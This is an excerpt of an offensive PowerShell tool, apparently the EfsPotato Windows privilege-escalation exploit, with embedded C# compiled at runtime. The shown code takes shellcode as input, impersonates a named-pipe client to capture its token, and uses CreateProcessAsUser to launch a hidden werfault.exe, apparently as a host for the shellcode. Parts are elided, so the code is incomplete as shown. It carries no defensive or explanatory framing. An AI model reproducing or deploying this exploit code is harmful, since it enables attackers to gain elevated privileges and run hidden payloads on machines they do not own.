function EfsPotato
{
    ...
    $parameters = @($Shellcode, $Pipe)
    Add-Type -TypeDefinition $Source -Language CSharp;
    $output = [EfsPotato]::Run($parameters)
    Write-Output $output
}
	...
	public static void Run(string[] args)
	{
		...
		if (mre.WaitOne(3000))
		{
			if (ImpersonateNamedPipeClient(hPipe))
			{
				...
				si.dwFlags = 0x101;
				si.wShowWindow = 0;
				if (CreateProcessAsUser(tkn, null, @"c:\Windows\System32\werfault.exe", IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
				{
